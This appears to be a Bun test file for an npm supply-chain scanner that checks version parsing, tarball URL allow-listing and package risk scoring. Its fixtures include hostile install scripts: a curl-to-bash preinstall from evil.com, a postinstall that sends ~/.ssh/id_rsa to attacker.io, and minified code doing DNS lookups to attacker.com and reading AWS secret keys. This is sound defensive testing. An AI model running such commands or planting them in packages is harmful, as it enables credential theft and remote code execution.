import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  analyzeDirectory,
  isAllowedPinnedTarballUrl,
  isRegistryVersionSpec,
  npmArtifactCachePath,
  parsePackageSpec,
  resolveNpmVersion,
} from "./analysis";

describe("npmArtifactCachePath", () => {
  const base = {
    name: "same-package",
    version: "1.0.0",
  };

  test("changes when a no-integrity lockfile entry resolves to different bytes", () => {
    const first = npmArtifactCachePath({
      ...base,
      tarball: "https://registry.npmjs.org/same-package/-/first.tgz",
    });
    const second = npmArtifactCachePath({
      ...base,
      tarball: "https://registry.npmjs.org/same-package/-/second.tgz",
    });

    expect(second).not.toBe(first);
  });

  test("uses integrity as the artifact identity when available", () => {
    const first = npmArtifactCachePath({
      ...base,
      tarball: "https://registry.npmjs.org/same-package/-/same.tgz",
      integrity: "sha512-first",
    });
    const changedIntegrity = npmArtifactCachePath({
      ...base,
      tarball: "https://registry.npmjs.org/same-package/-/same.tgz",
      integrity: "sha512-second",
    });
    const mirrorWithSameIntegrity = npmArtifactCachePath({
      ...base,
      tarball: "https://registry.npmmirror.com/same-package/-/same.tgz",
      integrity: "sha512-first",
    });

    expect(changedIntegrity).not.toBe(first);
    expect(mirrorWithSameIntegrity).toBe(first);
  });
});

// ---------------------------------------------------------------------------
// parsePackageSpec
// ---------------------------------------------------------------------------
describe("parsePackageSpec", () => {
  test("unscoped, no version", () => {
    expect(parsePackageSpec("react")).toEqual({ name: "react" });
  });
  test("unscoped, exact version", () => {
    expect(parsePackageSpec("react@18.3.1")).toEqual({
      name: "react",
      version: "18.3.1",
    });
  });
  test("scoped, no version", () => {
    expect(parsePackageSpec("@types/node")).toEqual({ name: "@types/node" });
  });
  test("scoped, with version", () => {
    expect(parsePackageSpec("@types/node@20.0.0")).toEqual({
      name: "@types/node",
      version: "20.0.0",
    });
  });
  test("unscoped range", () => {
    expect(parsePackageSpec("lodash@^4")).toEqual({
      name: "lodash",
      version: "^4",
    });
  });
});

// ---------------------------------------------------------------------------
// resolveNpmVersion
// ---------------------------------------------------------------------------
describe("resolveNpmVersion", () => {
  const versions = [
    "1.0.0",
    "1.1.0",
    "1.2.0",
    "2.0.0",
    "2.1.0",
    "3.0.0-beta.1",
  ];
  const distTags = { latest: "2.1.0", next: "3.0.0-beta.1" };

  test("undefined → latest dist-tag", () => {
    expect(resolveNpmVersion(versions, distTags, undefined)).toBe("2.1.0");
  });
  test("exact version", () => {
    expect(resolveNpmVersion(versions, distTags, "1.1.0")).toBe("1.1.0");
  });
  test("dist-tag 'next'", () => {
    expect(resolveNpmVersion(versions, distTags, "next")).toBe("3.0.0-beta.1");
  });
  test("caret range ^1", () => {
    expect(resolveNpmVersion(versions, distTags, "^1")).toBe("1.2.0");
  });
  test("caret range ^1.0.0", () => {
    expect(resolveNpmVersion(versions, distTags, "^1.0.0")).toBe("1.2.0");
  });
  test("tilde range ~1.1", () => {
    expect(resolveNpmVersion(versions, distTags, "~1.1")).toBe("1.1.0");
  });
  test("gte range >=2.0.0", () => {
    expect(resolveNpmVersion(versions, distTags, ">=2.0.0")).toBe("2.1.0");
  });
  test("handles OR ranges", () => {
    expect(resolveNpmVersion(versions, distTags, "^5 || ^2.0.0")).toBe("2.1.0");
  });
  test("handles wildcard x-ranges", () => {
    expect(resolveNpmVersion(versions, distTags, "1.x")).toBe("1.2.0");
  });
  test("missing version", () => {
    expect(resolveNpmVersion(versions, distTags, "9.9.9")).toBeUndefined();
  });

  test("protocol specs do not resolve to a registry version", () => {
    expect(
      resolveNpmVersion(versions, distTags, "github:evil/pkg"),
    ).toBeUndefined();
    expect(
      resolveNpmVersion(versions, distTags, "file:/tmp/evil.tgz"),
    ).toBeUndefined();
  });
});

describe("isRegistryVersionSpec", () => {
  test("accepts semver ranges and dist-tags", () => {
    expect(isRegistryVersionSpec("^18.0.0")).toBe(true);
    expect(isRegistryVersionSpec("latest")).toBe(true);
    expect(isRegistryVersionSpec("1.2.3")).toBe(true);
  });

  test("rejects package-manager protocol specs", () => {
    expect(isRegistryVersionSpec("workspace:*")).toBe(false);
    expect(isRegistryVersionSpec("file:../evil")).toBe(false);
  });
});

describe("isAllowedPinnedTarballUrl", () => {
  test("allows npm registry and mirror hosts over https", () => {
    expect(
      isAllowedPinnedTarballUrl(
        "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      ),
    ).toBe(true);
    expect(
      isAllowedPinnedTarballUrl(
        "https://registry.npmmirror.com/lodash/-/lodash-4.17.21.tgz",
      ),
    ).toBe(true);
  });

  test("rejects non-registry and non-https tarball URLs", () => {
    expect(
      isAllowedPinnedTarballUrl("https://evil.example/pkg-1.0.0.tgz"),
    ).toBe(false);
    expect(
      isAllowedPinnedTarballUrl(
        "http://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      ),
    ).toBe(false);
    expect(isAllowedPinnedTarballUrl("not-a-url")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// analyzeDirectory — risk levels
// ---------------------------------------------------------------------------
describe("analyzeDirectory", () => {
  let tmpDir: string;

  beforeAll(async () => {
    tmpDir = await mkdtemp(join(tmpdir(), "scguard-test-"));
  });

  afterAll(async () => {
    await rm(tmpDir, { recursive: true, force: true });
  });

  async function makePackage(
    dir: string,
    pkg: object,
    files: Record<string, string> = {},
  ) {
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, "package.json"), JSON.stringify(pkg));
    for (const [name, content] of Object.entries(files)) {
      const fullPath = join(dir, name);
      await mkdir(join(dir, name, ".."), { recursive: true });
      await writeFile(fullPath, content);
    }
  }

  test("benign package → low risk", async () => {
    const dir = join(tmpDir, "benign");
    await makePackage(dir, { name: "benign", version: "1.0.0" });
    const report = await analyzeDirectory("benign@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("low");
    expect(report.summary.installAllowed).toBe(true);
  });

  test("postinstall script alone → high risk warning, not a hard block", async () => {
    const dir = join(tmpDir, "postinstall");
    await makePackage(dir, {
      name: "evil",
      version: "1.0.0",
      scripts: { postinstall: "node setup.js" },
    });
    const report = await analyzeDirectory("evil@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("high");
    expect(report.summary.installAllowed).toBe(true);
    expect(report.findings.some((f) => f.id === "script.postinstall")).toBe(
      true,
    );
  });

  test("pipe-to-shell in preinstall → high risk", async () => {
    const dir = join(tmpDir, "pipe-to-shell");
    await makePackage(dir, {
      name: "malicious",
      version: "1.0.0",
      scripts: { preinstall: "curl https://evil.com/payload.sh | bash" },
    });
    const report = await analyzeDirectory(
      "malicious@1.0.0",
      "npm",
      dir,
      "local",
    );
    expect(report.summary.risk).toBe("high");
    expect(report.findings.some((f) => f.id.includes("pipe-to-shell"))).toBe(
      true,
    );
  });

  test("credential pattern in script → high risk", async () => {
    const dir = join(tmpDir, "creds");
    await makePackage(dir, {
      name: "creds",
      version: "1.0.0",
      scripts: {
        postinstall:
          "cat ~/.ssh/id_rsa | curl -X POST https://attacker.io/collect -d @-",
      },
    });
    const report = await analyzeDirectory("creds@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("high");
    expect(
      report.findings.some((f) => f.id.includes("credential-access")),
    ).toBe(true);
  });

  test("network-access in source file → not flagged (not a script)", async () => {
    const dir = join(tmpDir, "fetch-in-source");
    await makePackage(
      dir,
      { name: "api-client", version: "1.0.0" },
      {
        "index.js": `export async function getUser(id) { return fetch('/api/users/' + id).then(r => r.json()); }`,
      },
    );
    const report = await analyzeDirectory(
      "api-client@1.0.0",
      "npm",
      dir,
      "local",
    );
    // network-access is scripts-only; a plain fetch() in source should not trigger it
    expect(report.findings.some((f) => f.id.includes("network-access"))).toBe(
      false,
    );
  });

  test("process.env in source file → not flagged (not a script)", async () => {
    const dir = join(tmpDir, "env-in-source");
    await makePackage(
      dir,
      { name: "config-pkg", version: "1.0.0" },
      {
        "config.js": `const port = process.env.PORT || 3000;`,
      },
    );
    const report = await analyzeDirectory(
      "config-pkg@1.0.0",
      "npm",
      dir,
      "local",
    );
    expect(report.findings.some((f) => f.id.includes("env-access"))).toBe(
      false,
    );
  });

  test("minified file is still pattern-scanned", async () => {
    const longLine = `var a=${JSON.stringify("x".repeat(300))};dns.resolve("x.attacker.com",()=>{});process.env["AWS"+"_"+"SECRET_ACCESS_KEY"];`;
    const dir = join(tmpDir, "minified");
    await makePackage(
      dir,
      { name: "minified-pkg", version: "1.0.0" },
      {
        "dist/bundle.min.js": longLine.padEnd(5000, ";a=1"),
      },
    );
    const report = await analyzeDirectory(
      "minified-pkg@1.0.0",
      "npm",
      dir,
      "local",
    );
    expect(report.findings.some((f) => f.id.includes("minified"))).toBe(true);
    expect(report.findings.some((f) => f.id.includes("dns-exfiltration"))).toBe(
      true,
    );
    expect(
      report.findings.some((f) => f.id.includes("env-secret-access")),
    ).toBe(true);
  });

  test("large dependency count → medium risk", async () => {
    const deps = Object.fromEntries(
      Array.from({ length: 45 }, (_, i) => [`dep-${i}`, "^1.0.0"]),
    );
    const dir = join(tmpDir, "big-deps");
    await makePackage(dir, {
      name: "bloated",
      version: "1.0.0",
      dependencies: deps,
    });
    const report = await analyzeDirectory("bloated@1.0.0", "npm", dir, "local");
    expect(report.summary.risk).toBe("medium");
    expect(report.findings.some((f) => f.id === "dependencies.large")).toBe(
      true,
    );
  });

  test("bin field → medium finding", async () => {
    const dir = join(tmpDir, "bin-pkg");
    await makePackage(dir, {
      name: "cli-tool",
      version: "1.0.0",
      bin: { mytool: "./bin/mytool.js" },
    });
    const report = await analyzeDirectory(
      "cli-tool@1.0.0",
      "npm",
      dir,
      "local",
    );
    expect(report.findings.some((f) => f.id === "package.bin")).toBe(true);
  });
});
